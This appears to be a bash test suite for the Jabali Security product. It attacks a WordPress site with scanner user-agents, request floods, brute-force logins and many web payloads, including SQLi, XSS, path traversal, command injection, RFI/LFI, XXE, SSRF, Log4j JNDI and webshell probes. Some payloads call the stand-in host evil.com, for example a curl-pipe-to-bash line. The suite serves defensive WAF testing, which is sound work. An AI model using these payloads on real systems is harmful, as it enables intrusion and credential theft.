#!/bin/bash
# ============================================================================
# Jabali Security — Full External Attack & Verification Suite
# ============================================================================
# Comprehensive external test that attacks a live WordPress site, then
# SSHes into the server to verify every Jabali Security feature detected
# and responded to the attacks correctly.
#
# Attack phases (external HTTP):
#   - WebShield bot filtering, rate limiting, JS challenges
#   - WAF bypass attempts: SQLi, XSS, path traversal, command injection,
#     RFI/LFI, XXE, SSRF, CRLF, webshell probes
#   - WordPress attacks: user enumeration, XML-RPC brute force, wp-login
#     brute force, sensitive file exposure, directory listing
#   - Malware upload simulation, webshell access patterns
#
# Verification phases (SSH -> API):
#   - Incident creation verification
#   - WAF event logging
#   - Brute-force detection stats
#   - Malware scanning (plant + scan + quarantine lifecycle)
#   - Proactive defense (PHP hardening, process killer)
#   - Threat intelligence lookups
#   - Cleanup engine
#   - UFW firewall management
#   - Config API
#   - WebShield management
#   - Input validation / injection resistance
#
# Usage:
#   ./tests/test_full_attack.sh <target>
#   ./tests/test_full_attack.sh jabali.site
#   ./tests/test_full_attack.sh jabali.site --quick          # skip nmap
#   ./tests/test_full_attack.sh jabali.site --ssh 10.0.3.13  # SSH alias
#   ./tests/test_full_attack.sh jabali.site --skip-firewall
#
# Requirements: curl, jq, openssl, nmap (optional), SSH access to target
# ============================================================================
set -uo pipefail

# ── Config ──────────────────────────────────────────────────────────────────

TARGET="${1:-}"
shift || true

PROTO="https"
REPORT_FILE="/tmp/jabali-full-attack-$(date +%Y%m%d-%H%M%S).txt"
QUICK=false
SSH_ALIAS=""
SKIP_FIREWALL=false

PASS=0
FAIL=0
WARN=0
SKIP_COUNT=0

BROWSER_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

# Track cleanup items on the remote server
REMOTE_BLOCKED_IPS=()
REMOTE_TEST_FILES=()

# ── Parse Args ─────────────────────────────────────────────────────────────

while [[ $# -gt 0 ]]; do
    case "$1" in
        --quick) QUICK=true; shift ;;
        --ssh) SSH_ALIAS="$2"; shift 2 ;;
        --skip-firewall) SKIP_FIREWALL=true; shift ;;
        --http) PROTO="http"; shift ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

# ── Helpers ────────────────────────────────────────────────────────────────

red()    { printf "\033[0;31m%s\033[0m\n" "$*"; }
green()  { printf "\033[0;32m%s\033[0m\n" "$*"; }
yellow() { printf "\033[0;33m%s\033[0m\n" "$*"; }
bold()   { printf "\033[1m%s\033[0m\n" "$*"; }
dim()    { printf "\033[2m%s\033[0m\n" "$*"; }

log() {
    echo "$*" | tee -a "$REPORT_FILE"
}

pass() {
    PASS=$((PASS + 1))
    green "  [PASS] $*" | tee -a "$REPORT_FILE"
}

fail() {
    FAIL=$((FAIL + 1))
    red "  [FAIL] $*" | tee -a "$REPORT_FILE"
}

warn() {
    WARN=$((WARN + 1))
    yellow "  [WARN] $*" | tee -a "$REPORT_FILE"
}

skip_test() {
    SKIP_COUNT=$((SKIP_COUNT + 1))
    dim "  [SKIP] $*" | tee -a "$REPORT_FILE"
}

info() {
    dim "  [INFO] $*" | tee -a "$REPORT_FILE"
}

separator() {
    log ""
    log "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# HTTP helpers — with browser UA (bypass WebShield for vuln testing)
http_code() {
    local code
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 -H "User-Agent: ${BROWSER_UA}" "$@" 2>/dev/null) || true
    echo "${code:-000}"
}

http_response() {
    curl -sk --max-time 10 -H "User-Agent: ${BROWSER_UA}" "$@" 2>/dev/null
}

http_headers() {
    curl -skI --max-time 10 -H "User-Agent: ${BROWSER_UA}" "$@" 2>/dev/null
}

# Raw curl without browser UA — for bot/challenge tests
http_code_raw() {
    local code
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "$@" 2>/dev/null) || true
    echo "${code:-000}"
}

http_response_raw() {
    curl -sk --max-time 10 "$@" 2>/dev/null
}

# POST with form data
http_post_code() {
    local code
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 -H "User-Agent: ${BROWSER_UA}" -X POST "$@" 2>/dev/null) || true
    echo "${code:-000}"
}

# SSH command helper — runs command on remote server
ssh_cmd() {
    ssh -o ConnectTimeout=10 -o BatchMode=yes "$SSH_HOST" "$@" 2>/dev/null
}

# Remote API call via SSH + Unix socket
remote_api() {
    local method="$1"
    local path="$2"
    shift 2
    local extra_args=""
    if [ $# -gt 0 ]; then
        # Escape the data for SSH
        extra_args="$*"
    fi
    ssh_cmd "curl -s --unix-socket /run/jabali-security/jabali-security.sock \
        -X ${method} \
        -H 'X-API-Key: ${API_KEY}' \
        -H 'Content-Type: application/json' \
        ${extra_args} \
        'http://localhost/api/v1${path}'" 2>/dev/null
}

# JSON helpers
json_success() {
    echo "$1" | jq -r '.success // false' 2>/dev/null
}

json_data() {
    echo "$1" | jq -r ".data${2:+.$2}" 2>/dev/null
}

json_error() {
    echo "$1" | jq -r '.error // empty' 2>/dev/null
}

# Check if feature is enabled via remote API
feature_enabled() {
    local key="$1"
    local result
    result=$(remote_api GET /config)
    echo "$result" | jq -r --arg k "$key" '.data[$k] // "no"' 2>/dev/null | grep -q '^yes$'
}

# ── Validation ─────────────────────────────────────────────────────────────

if [ -z "$TARGET" ]; then
    bold "Usage: $0 <target-domain> [options]"
    log ""
    log "Options:"
    log "  --quick            Skip nmap port scan"
    log "  --ssh <alias>      SSH host alias (default: auto-detect)"
    log "  --skip-firewall    Skip UFW firewall tests"
    log "  --http             Use HTTP instead of HTTPS"
    log ""
    log "Examples:"
    log "  $0 jabali.site"
    log "  $0 jabali.site --ssh 10.0.3.13"
    log "  $0 jabali.site --quick --skip-firewall"
    exit 1
fi

if ! command -v jq &>/dev/null; then
    red "Error: jq is required (apt install jq)"
    exit 1
fi

# Detect protocol — try HTTPS first, fallback to HTTP
if [ "$PROTO" = "https" ]; then
    if ! curl -sk --max-time 5 -o /dev/null "${PROTO}://${TARGET}/" 2>/dev/null; then
        PROTO="http"
        if ! curl -sk --max-time 5 -o /dev/null "${PROTO}://${TARGET}/" 2>/dev/null; then
            red "Error: Cannot reach ${TARGET} via HTTPS or HTTP"
            exit 1
        fi
        info "HTTPS not available, using HTTP"
    fi
fi

# Detect SSH access
SSH_HOST=""
if [ -n "$SSH_ALIAS" ]; then
    if ssh -o ConnectTimeout=5 -o BatchMode=yes "$SSH_ALIAS" "echo ok" &>/dev/null; then
        SSH_HOST="$SSH_ALIAS"
    else
        red "Error: Cannot SSH to '${SSH_ALIAS}'"
        exit 1
    fi
else
    for candidate in 10.0.3.13 "$TARGET"; do
        if ssh -o ConnectTimeout=5 -o BatchMode=yes "$candidate" "echo ok" &>/dev/null; then
            SSH_HOST="$candidate"
            break
        fi
    done
fi

# If we have SSH, get the API key
API_KEY=""
if [ -n "$SSH_HOST" ]; then
    API_KEY=$(ssh_cmd 'grep "^API_KEY=" /etc/jabali-security/jabali-security.conf 2>/dev/null | sed "s/^API_KEY=//;s/^\"//;s/\"$//"' | head -1)
fi

# ── Cleanup Handler ────────────────────────────────────────────────────────

cleanup() {
    if [ -n "$SSH_HOST" ] && [ -n "$API_KEY" ]; then
        log ""
        separator
        bold "CLEANUP"
        separator

        # Unblock test IPs
        for ip in "${REMOTE_BLOCKED_IPS[@]+"${REMOTE_BLOCKED_IPS[@]}"}"; do
            if [ -n "$ip" ]; then
                remote_api DELETE "/block/${ip}" &>/dev/null
                info "Unblocked test IP: ${ip}"
            fi
        done

        # Remove test files planted on server
        for f in "${REMOTE_TEST_FILES[@]+"${REMOTE_TEST_FILES[@]}"}"; do
            if [ -n "$f" ]; then
                ssh_cmd "rm -f '$f'" 2>/dev/null
                info "Removed remote test file: ${f}"
            fi
        done

        log ""
        log "Cleanup complete."
    fi
}

trap cleanup EXIT

# ── Start ──────────────────────────────────────────────────────────────────

: > "$REPORT_FILE"

bold "╔════════════════════════════════════════════════════════════════════════╗"
bold "║      Jabali Security — Full External Attack & Verification Suite     ║"
bold "╚════════════════════════════════════════════════════════════════════════╝"
log ""
log "Target:  ${TARGET} (${PROTO})"
log "SSH:     ${SSH_HOST:-not available}"
if [ -n "$API_KEY" ]; then
    log "API Key: set (${#API_KEY} chars)"
else
    log "API Key: not available"
fi
log "Date:    $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
log "Report:  ${REPORT_FILE}"


# ############################################################################
#
#   PART A: EXTERNAL HTTP ATTACKS
#
# ############################################################################


# ============================================================================
# PHASE 1: RECONNAISSANCE
# ============================================================================
separator
bold "PHASE 1: RECONNAISSANCE"
separator

# -- 1.1 Port Scan --
if [ "$QUICK" = false ] && command -v nmap &>/dev/null; then
    log ""
    log "1.1 Port Scan (top 100 ports)"
    nmap_out=$(timeout 60 nmap -sV -T4 --top-ports 100 --host-timeout 30s "$TARGET" 2>&1)
    open_ports=$(echo "$nmap_out" | grep "^[0-9].*open" || true)
    if [ -n "$open_ports" ]; then
        while IFS= read -r line; do
            info "$line"
        done <<< "$open_ports"
    fi

    if echo "$open_ports" | grep -qE "^3306|^5432|^6379|^27017|^11211"; then
        fail "Database/cache ports exposed to the internet"
    else
        pass "No database/cache ports exposed"
    fi

    if echo "$open_ports" | grep -q "^9876"; then
        fail "Jabali API port 9876 exposed (should use Unix socket only)"
    else
        pass "API port 9876 not exposed"
    fi
else
    log ""
    log "1.1 Port Scan — SKIPPED (--quick or nmap not installed)"
fi

# -- 1.2 HTTP Security Headers --
log ""
log "1.2 HTTP Security Headers"
headers=$(http_headers "${PROTO}://${TARGET}/")

check_header() {
    local name="$1"
    local display="${2:-$1}"
    if echo "$headers" | grep -qi "^${name}:"; then
        pass "${display} header present"
    else
        fail "${display} header MISSING"
    fi
}

check_header "X-Frame-Options" "X-Frame-Options"
check_header "X-Content-Type-Options" "X-Content-Type-Options"
check_header "Content-Security-Policy" "Content-Security-Policy"
check_header "Referrer-Policy" "Referrer-Policy"
check_header "X-XSS-Protection" "X-XSS-Protection (legacy)"

if echo "$headers" | grep -qi "^server:.*nginx/[0-9]"; then
    warn "Server header leaks nginx version"
else
    pass "Server header does not leak version"
fi

# -- 1.3 TLS --
log ""
log "1.3 TLS Certificate"
tls_info=$(echo | openssl s_client -connect "${TARGET}:443" -servername "$TARGET" 2>/dev/null | openssl x509 -noout -subject -dates 2>/dev/null || echo "FAIL")
if echo "$tls_info" | grep -q "subject="; then
    pass "Valid TLS certificate"
    info "$(echo "$tls_info" | grep 'notAfter=')"
else
    warn "Could not verify TLS certificate"
fi

# -- 1.4 HTTPS Redirect --
log ""
log "1.4 HTTP -> HTTPS Redirect"
http_status=$(http_code "http://${TARGET}/")
if [ "$http_status" = "301" ] || [ "$http_status" = "302" ]; then
    pass "HTTP redirects to HTTPS (${http_status})"
else
    warn "HTTP does not redirect to HTTPS (got ${http_status})"
fi

# ============================================================================
# PHASE 2: WEBSHIELD ATTACKS
# ============================================================================
separator
bold "PHASE 2: WEBSHIELD ATTACKS (Bot Filtering + Rate Limiting)"
separator

# -- 2.1 Malicious User-Agents (should get 403) --
log ""
log "2.1 Malicious User-Agent Blocking"

test_ua() {
    local name="$1"
    local ua="$2"
    local code
    if [ -n "$ua" ]; then
        code=$(http_code_raw -H "User-Agent: ${ua}" "${PROTO}://${TARGET}/")
    else
        code=$(http_code_raw "${PROTO}://${TARGET}/")
    fi
    if [ "$code" = "403" ] || [ "$code" = "429" ] || [ "$code" = "444" ]; then
        pass "Blocked '${name}' -> ${code}"
    elif [ "$code" = "503" ]; then
        pass "Challenged '${name}' -> ${code} (JS challenge)"
    elif [ "$code" = "200" ] || [ "$code" = "301" ] || [ "$code" = "302" ]; then
        warn "'${name}' NOT blocked -> ${code}"
    else
        info "'${name}' -> ${code}"
    fi
}

# Security scanners (should be blocked)
test_ua "sqlmap"     "sqlmap/1.5#stable (http://sqlmap.org)"
test_ua "nikto"      "Mozilla/5.00 (Nikto/2.1.6)"
test_ua "nmap"       "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
test_ua "masscan"    "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
test_ua "dirbuster"  "DirBuster-1.0-RC1 (http://www.owasp.org/)"
test_ua "gobuster"   "gobuster/3.1"
test_ua "wpscan"     "WPScan v3.8.22"
test_ua "acunetix"   "Acunetix Web Vulnerability Scanner"
test_ua "nessus"     "Nessus SOAP"
test_ua "openvas"    "OpenVAS"
test_ua "havij"      "Havij"
test_ua "zgrab"      "Mozilla/5.0 zgrab/0.x"

# Suspicious automation (should get JS challenge / 503)
test_ua "python-requests" "python-requests/2.28.1"
test_ua "python-urllib"   "Python-urllib/3.10"
test_ua "curl-default"    ""
test_ua "go-http"         "Go-http-client/1.1"
test_ua "java"            "Java/11.0.2"
test_ua "libwww-perl"     "libwww-perl/6.67"

# -- 2.2 Rate Limiting --
log ""
log "2.2 Rate Limiting (60 rapid requests)"
rate_limited=false
for i in $(seq 1 60); do
    code=$(http_code "${PROTO}://${TARGET}/")
    if [ "$code" = "429" ] || [ "$code" = "503" ]; then
        pass "Rate limited after ${i} requests -> ${code}"
        rate_limited=true
        break
    fi
done
if [ "$rate_limited" = false ]; then
    warn "No rate limiting detected after 60 rapid requests"
fi

# -- 2.3 JS Challenge --
log ""
log "2.3 JavaScript Challenge"
body=$(http_response_raw -H "User-Agent: python-requests/2.28.1" "${PROTO}://${TARGET}/")
if echo "$body" | grep -qi "challenge\|captcha\|verify.*human\|jabali"; then
    pass "JS challenge page served for suspicious UA"
else
    code=$(http_code_raw -H "User-Agent: python-requests/2.28.1" "${PROTO}://${TARGET}/")
    if [ "$code" = "503" ]; then
        pass "Suspicious UA gets 503 challenge response"
    elif [ "$code" = "403" ]; then
        pass "Suspicious UA blocked -> 403"
    else
        warn "No JS challenge detected for suspicious UA (got ${code})"
    fi
fi

# ============================================================================
# PHASE 3: WAF ATTACKS (SQLi, XSS, Path Traversal, Command Injection, etc.)
# ============================================================================
separator
bold "PHASE 3: WAF ATTACKS"
separator

# Helper: test an attack payload, expect 403/400/444
test_waf() {
    local category="$1"
    local payload="$2"
    local url="${3:-${PROTO}://${TARGET}${payload}}"
    local code body
    code=$(http_code "$url")

    if [ "$code" = "403" ] || [ "$code" = "400" ] || [ "$code" = "444" ] || [ "$code" = "406" ]; then
        pass "${category} blocked -> ${code}"
    elif [ "$code" = "500" ]; then
        warn "${category} returned 500 (unhandled error)"
    else
        # Check if actual sensitive data leaked
        # Only flag real system/credential patterns, not CSS (box-shadow:) or HTML (password fields)
        body=$(http_response "$url")
        if echo "$body" | grep -qP "root:x:0:0:|root:\\\$[0-9a-z]+\\\$|DB_PASSWORD\s*[='\")]|define\s*\(\s*['\"]DB_|APP_KEY\s*=\s*base64:"; then
            fail "${category} LEAKED sensitive data (${code})"
        elif [ "$code" = "200" ]; then
            warn "${category} not blocked by WAF -> ${code}"
        else
            info "${category} returned ${code} (not blocked by WAF)"
        fi
    fi
}

# -- 3.1 SQL Injection --
log ""
log "3.1 SQL Injection Attacks"

test_waf "SQLi: OR 1=1"           "/?id=1%27%20OR%20%271%27=%271"
test_waf "SQLi: UNION SELECT"     "/?id=1%20UNION%20SELECT%20NULL,NULL,NULL--"
test_waf "SQLi: DROP TABLE"       "/?id=1;%20DROP%20TABLE%20users--"
test_waf "SQLi: AND 1=1"          "/?s=1%27%20AND%201=1%20--%20-"
test_waf "SQLi: wp-login"         "/wp-login.php?log=admin%27%20OR%201=1--&pwd=test"
test_waf "SQLi: SLEEP"            "/?id=1%27%20AND%20SLEEP(5)--%20-"
test_waf "SQLi: BENCHMARK"        "/?id=1%27%20AND%20BENCHMARK(10000000,MD5(%271%27))--%20-"
test_waf "SQLi: INTO OUTFILE"     "/?id=1%27%20INTO%20OUTFILE%20%27/tmp/pwned%27--%20-"
test_waf "SQLi: LOAD_FILE"        "/?id=1%27%20UNION%20SELECT%20LOAD_FILE(%27/etc/passwd%27)--%20-"
test_waf "SQLi: hex encode"       "/?id=0x31%20UNION%20SELECT%200x61646d696e"

# -- 3.2 XSS --
log ""
log "3.2 XSS Injection Attacks"

test_waf "XSS: script tag"        "/?s=<script>alert(1)</script>"
test_waf "XSS: img onerror"       "/?s=<img%20src=x%20onerror=alert(1)>"
test_waf "XSS: svg onload"        '/?s="><svg/onload=alert(1)>'
test_waf "XSS: javascript:"       "/?s=javascript:alert(document.cookie)"
test_waf "XSS: iframe"            "/?s=<iframe%20src=%27javascript:alert(1)%27>"
test_waf "XSS: event handler"     "/?s=<body%20onload=alert(1)>"
test_waf "XSS: data URI"          "/?s=<object%20data=%22data:text/html,<script>alert(1)</script>%22>"
test_waf "XSS: base64 encoded"    "/?s=<script>eval(atob('YWxlcnQoMSk='))</script>"

# -- 3.3 Path Traversal --
log ""
log "3.3 Path Traversal Attacks"

test_waf "Traversal: ../etc/passwd"    "/../../../etc/passwd"
test_waf "Traversal: encoded"         "/..%2f..%2f..%2fetc%2fpasswd"
test_waf "Traversal: double-encoded"  "/..%252f..%252f..%252fetc%252fpasswd"
test_waf "Traversal: null byte"       "/..%00/../../../etc/passwd"
test_waf "Traversal: param"           "/?file=../../../etc/passwd"
test_waf "Traversal: dotdot-slash"    "/?page=....//....//....//etc/passwd"
test_waf "Traversal: wp-content"      "/wp-content/../../../etc/shadow"

# -- 3.4 Command Injection --
log ""
log "3.4 Command Injection Attacks"

test_waf "CMDi: semicolon"       "/?cmd=;cat%20/etc/passwd"
test_waf "CMDi: pipe"            "/?file=|ls%20-la"
test_waf "CMDi: newline"         "/?ping=127.0.0.1%0als"
test_waf "CMDi: backtick"        "/?input=%60whoami%60"
test_waf "CMDi: dollar paren"    "/?input=%24(id)"
test_waf "CMDi: && chain"        "/?cmd=test%20%26%26%20cat%20/etc/passwd"
test_waf "CMDi: curl pipe bash"  "/?cmd=curl%20http://evil.com/shell.sh|bash"

# -- 3.5 Remote/Local File Inclusion --
log ""
log "3.5 File Inclusion Attacks"

test_waf "RFI: http include"     "/?page=http://evil.com/shell.txt"
test_waf "RFI: ftp include"      "/?page=ftp://evil.com/shell.txt"
test_waf "LFI: php filter"       "/?page=php://filter/convert.base64-encode/resource=/etc/passwd"
test_waf "LFI: php input"        "/?page=php://input"
test_waf "LFI: data scheme"      "/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
test_waf "LFI: expect"           "/?page=expect://id"

# -- 3.6 XXE / SSRF / CRLF --
log ""
log "3.6 XXE / SSRF / CRLF Attacks"

# XXE via POST
xxe_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    -H "User-Agent: ${BROWSER_UA}" -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
    "${PROTO}://${TARGET}/xmlrpc.php" 2>/dev/null) || true
if [ "$xxe_code" = "403" ] || [ "$xxe_code" = "400" ] || [ "$xxe_code" = "444" ]; then
    pass "XXE blocked -> ${xxe_code}"
else
    info "XXE -> ${xxe_code}"
fi

test_waf "SSRF: localhost"       "/?url=http://127.0.0.1:9876/api/v1/status"
test_waf "SSRF: metadata"        "/?url=http://169.254.169.254/latest/meta-data/"

crlf_code=$(http_code "${PROTO}://${TARGET}/%0d%0aSet-Cookie:%20evil=1")
if [ "$crlf_code" = "403" ] || [ "$crlf_code" = "400" ]; then
    pass "CRLF injection blocked -> ${crlf_code}"
else
    info "CRLF injection -> ${crlf_code}"
fi

# -- 3.7 Webshell Pattern Probes --
log ""
log "3.7 Webshell Access Patterns"

test_waf "Shell: system()"       "/?cmd=system(%27id%27)"
test_waf "Shell: passthru()"     "/?c=passthru(%27cat+/etc/passwd%27)"
test_waf "Shell: eval base64"    "/?eval=base64_decode(%27cGhwaW5mbygp%27)"
test_waf "Shell: shell_exec()"   "/?cmd=shell_exec(%27whoami%27)"
test_waf "Shell: proc_open()"    "/?cmd=proc_open(%27/bin/sh%27)"

# POST-based webshell probes
post_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    -H "User-Agent: ${BROWSER_UA}" \
    -X POST -d "cmd=system('id');" \
    "${PROTO}://${TARGET}/wp-content/uploads/shell.php" 2>/dev/null) || true
if [ "$post_code" = "403" ] || [ "$post_code" = "404" ] || [ "$post_code" = "444" ]; then
    pass "POST to shell.php blocked/404 -> ${post_code}"
else
    warn "POST to shell.php returned ${post_code}"
fi

# -- 3.8 Log4j / JNDI Injection --
log ""
log "3.8 Log4j / JNDI Injection Probes"

test_waf "Log4j: jndi:ldap"        "/?x=%24%7Bjndi:ldap://evil.com/a%7D"
test_waf "Log4j: jndi:rmi"         "/?x=%24%7Bjndi:rmi://evil.com/a%7D"
test_waf "Log4j: jndi:dns"         "/?x=%24%7Bjndi:dns://evil.com%7D"
test_waf "Log4j: nested"           "/?x=%24%7Bj%24%7B::-n%7Ddi:ldap://evil.com%7D"

# Log4j in headers
for hdr in X-Forwarded-For X-Api-Version Referer X-Client-IP; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
        -H "User-Agent: ${BROWSER_UA}" \
        -H "${hdr}: \${jndi:ldap://evil.com/a}" \
        "${PROTO}://${TARGET}/" 2>/dev/null) || true
    if [ "$code" = "403" ] || [ "$code" = "444" ]; then
        pass "Log4j in ${hdr} blocked -> ${code}"
    else
        info "Log4j in ${hdr} -> ${code}"
    fi
done

# -- 3.9 HTTP Request Smuggling / Desync --
log ""
log "3.9 HTTP Request Smuggling Probes"

smuggle_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    -H "User-Agent: ${BROWSER_UA}" \
    -H "Transfer-Encoding: chunked" \
    -H "Transfer-Encoding: x" \
    "${PROTO}://${TARGET}/" 2>/dev/null) || true
if [ "$smuggle_code" = "400" ] || [ "$smuggle_code" = "403" ]; then
    pass "TE.CL duplicate header rejected -> ${smuggle_code}"
else
    info "TE.CL duplicate header -> ${smuggle_code}"
fi

# -- 3.10 Server-Side Template Injection (SSTI) --
log ""
log "3.10 SSTI Probes"

test_waf "SSTI: Jinja2"           "/?name=%7B%7B7*7%7D%7D"
test_waf "SSTI: Twig"            "/?name=%7B%7B_self.env.display%7D%7D"
test_waf "SSTI: config"          "/?name=%7B%7Bconfig.__class__.__init__.__globals__%7D%7D"

# -- 3.11 Host Header Attacks --
log ""
log "3.11 Host Header Attacks"

host_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    -H "User-Agent: ${BROWSER_UA}" \
    -H "Host: evil.com" \
    "${PROTO}://${TARGET}/" 2>/dev/null) || true
if [ "$host_code" = "400" ] || [ "$host_code" = "403" ] || [ "$host_code" = "444" ]; then
    pass "Host header injection blocked -> ${host_code}"
else
    info "Host header injection -> ${host_code} (check redirect target)"
fi

# -- 3.12 HTTP Method Probes --
log ""
log "3.12 HTTP Method Probes"

for method in TRACE TRACK DELETE PUT; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
        -H "User-Agent: ${BROWSER_UA}" \
        -X "$method" "${PROTO}://${TARGET}/" 2>/dev/null) || true
    if [ "$method" = "TRACE" ] || [ "$method" = "TRACK" ]; then
        if [ "$code" = "405" ] || [ "$code" = "403" ] || [ "$code" = "501" ]; then
            pass "${method} method blocked -> ${code}"
        else
            warn "${method} method allowed -> ${code} (info disclosure risk)"
        fi
    else
        info "${method} method -> ${code}"
    fi
done

# -- 3.13 Protocol Abuse --
log ""
log "3.13 Protocol Enforcement"

test_waf "Protocol: null byte URL"      "/%00"
test_waf "Protocol: backslash"          "/..\\..\\..\\etc\\passwd"
test_waf "Protocol: overlong UTF-8"     "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
test_waf "Protocol: semicolon"          "/;/admin"

# ============================================================================
# PHASE 4: WORDPRESS ATTACKS
# ============================================================================
separator
bold "PHASE 4: WORDPRESS ATTACKS"
separator

# -- 4.1 User Enumeration --
log ""
log "4.1 User Enumeration"

for i in 1 2 3 4 5; do
    body=$(http_response "${PROTO}://${TARGET}/?author=${i}")
    code=$(http_code "${PROTO}://${TARGET}/?author=${i}")
    if echo "$body" | grep -qoE 'author/[a-zA-Z0-9_-]+'; then
        username=$(echo "$body" | grep -oE 'author/[a-zA-Z0-9_-]+' | head -1 | cut -d/ -f2)
        warn "User enumeration: author=${i} -> ${username}"
    elif [ "$code" = "403" ]; then
        pass "User enumeration blocked for author=${i}"
    else
        info "author=${i} -> ${code} (no username leaked)"
    fi
done

# REST API user enum
body=$(http_response "${PROTO}://${TARGET}/wp-json/wp/v2/users")
code=$(http_code "${PROTO}://${TARGET}/wp-json/wp/v2/users")
if [ "$code" = "200" ] && echo "$body" | grep -q '"slug"'; then
    usernames=$(echo "$body" | grep -oE '"slug":"[^"]*"' | cut -d'"' -f4 | tr '\n' ', ')
    fail "WP REST API exposes usernames: ${usernames}"
elif [ "$code" = "403" ] || [ "$code" = "401" ]; then
    pass "WP REST API user listing blocked -> ${code}"
else
    info "WP REST API users -> ${code}"
fi

# -- 4.2 XML-RPC Attacks --
log ""
log "4.2 XML-RPC Attacks"

xmlrpc_code=$(http_code "${PROTO}://${TARGET}/xmlrpc.php")
if [ "$xmlrpc_code" = "403" ] || [ "$xmlrpc_code" = "444" ]; then
    pass "XML-RPC endpoint blocked -> ${xmlrpc_code}"
else
    if [ "$xmlrpc_code" = "405" ] || [ "$xmlrpc_code" = "200" ]; then
        # Try system.listMethods
        xmlrpc_body=$(curl -sk --max-time 10 -X POST \
            -H "Content-Type: text/xml" -H "User-Agent: ${BROWSER_UA}" \
            -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
            "${PROTO}://${TARGET}/xmlrpc.php" 2>/dev/null)
        if echo "$xmlrpc_body" | grep -q "wp.getUsersBlogs"; then
            fail "XML-RPC enabled and exposes methods (brute-force vector)"
        else
            warn "XML-RPC accessible (${xmlrpc_code}) but methods may be limited"
        fi

        # Try XML-RPC multicall brute force (the real attack vector)
        xmlrpc_bf=$(curl -sk --max-time 10 -X POST \
            -H "Content-Type: text/xml" -H "User-Agent: ${BROWSER_UA}" \
            -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>password1</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>' \
            "${PROTO}://${TARGET}/xmlrpc.php" 2>/dev/null)
        bf_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 -X POST \
            -H "Content-Type: text/xml" -H "User-Agent: ${BROWSER_UA}" \
            -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data></data></array></value></param></params></methodCall>' \
            "${PROTO}://${TARGET}/xmlrpc.php" 2>/dev/null) || true
        if [ "$bf_code" = "403" ]; then
            pass "XML-RPC multicall blocked -> 403"
        else
            info "XML-RPC multicall -> ${bf_code}"
        fi
    else
        info "XML-RPC -> ${xmlrpc_code}"
    fi
fi

# -- 4.3 wp-login Brute Force --
log ""
log "4.3 wp-login Brute Force (10 rapid failed logins)"

bf_blocked=false
for i in $(seq 1 10); do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "User-Agent: ${BROWSER_UA}" \
        -X POST "${PROTO}://${TARGET}/wp-login.php" \
        -d "log=admin&pwd=bruteforce_test_${i}&wp-submit=Log+In" \
        --max-time 10 2>/dev/null) || true
    if [ "$code" = "403" ] || [ "$code" = "429" ] || [ "$code" = "444" ]; then
        pass "Brute-force blocked after attempt ${i} -> ${code}"
        bf_blocked=true
        break
    fi
done
if [ "$bf_blocked" = false ]; then
    warn "10 failed logins not blocked (threshold may be higher or via auth log)"
fi

# -- 4.4 Sensitive File Exposure --
log ""
log "4.4 Sensitive File Exposure"

test_sensitive() {
    local path="$1"
    local code body
    code=$(http_code "${PROTO}://${TARGET}${path}")
    body=$(http_response "${PROTO}://${TARGET}${path}")

    case "$path" in
        *wp-config*|*.env|*.git*)
            if [ "$code" = "200" ]; then
                if echo "$body" | grep -qE "DB_PASSWORD|DB_NAME|define\(|AUTH_KEY|APP_KEY=|MAIL_PASSWORD="; then
                    fail "Sensitive file EXPOSED with credentials: ${path}"
                elif [ "$(echo "$body" | wc -c)" -lt 50 ]; then
                    # WordPress wp-config.php outputs blank page when accessed directly
                    warn "Sensitive file returns 200 but empty body: ${path}"
                else
                    warn "Sensitive file accessible (no creds in body): ${path} -> 200"
                fi
            elif [ "$code" = "403" ]; then
                pass "Sensitive file protected: ${path} -> 403"
            else
                pass "Sensitive file not accessible: ${path} -> ${code}"
            fi
            ;;
        */debug.log)
            if [ "$code" = "200" ] && [ "$(echo "$body" | wc -c)" -gt 100 ]; then
                fail "Debug log exposed: ${path}"
            else
                pass "Debug log not exposed: ${path} -> ${code}"
            fi
            ;;
        *)
            if [ "$code" = "200" ]; then
                warn "Path accessible: ${path}"
            elif [ "$code" = "403" ]; then
                pass "Path blocked: ${path} -> 403"
            else
                info "${path} -> ${code}"
            fi
            ;;
    esac
}

test_sensitive "/wp-config.php"
test_sensitive "/wp-config.php.bak"
test_sensitive "/wp-config.php~"
test_sensitive "/wp-config.php.save"
test_sensitive "/wp-config.php.orig"
test_sensitive "/.env"
test_sensitive "/.env.local"
test_sensitive "/.env.production"
test_sensitive "/.git/HEAD"
test_sensitive "/.git/config"
test_sensitive "/.gitignore"
test_sensitive "/wp-content/debug.log"
test_sensitive "/phpinfo.php"
test_sensitive "/info.php"
test_sensitive "/adminer.php"
test_sensitive "/server-status"
